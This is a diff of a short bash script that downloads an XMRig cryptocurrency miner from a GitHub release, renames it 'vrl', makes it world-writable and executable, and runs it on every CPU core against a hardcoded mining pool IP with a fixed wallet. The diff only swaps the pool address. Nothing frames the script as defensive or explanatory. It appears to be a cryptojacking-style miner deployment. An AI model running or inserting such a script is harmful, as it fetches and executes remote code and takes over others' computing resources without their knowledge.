@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
 chmod 777 vrl
-./vrl --donate-level 1 -o 136.244.87.16:8080 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy -p xt3 -a rx/0 -k -t $(nproc --all)
+./vrl --donate-level 1 -o 3.148.199.9:8080 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy -p xt3 -a rx/0 -k -t $(nproc --all)
